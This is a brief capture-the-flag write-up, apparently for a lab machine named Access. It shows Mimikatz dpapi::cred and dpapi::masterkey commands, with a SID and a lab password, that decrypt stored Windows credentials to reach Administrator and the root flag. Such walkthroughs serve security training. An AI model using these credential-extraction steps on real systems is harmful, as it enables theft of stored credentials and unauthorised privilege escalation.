# Mimikatz

**With mimikatz the credential file is examined, which reveals the corresponding masterkey (guidMasterKey)**

```bash
mimikatz# dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
/sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```

**The masterkey file is examined next, and the key is extracted.**

```bash
mimikatz# dpapi::masterkey /in:0792c32e-48a5-4fe3-8b43-d93d64590580
/sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```

**With the masterkey in mimikatz’s cache, the credential blob can now be decrypted. It is now possible to open a telnet session as ACCESS\Administrator and gain the root flag.**

```bash
dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
```
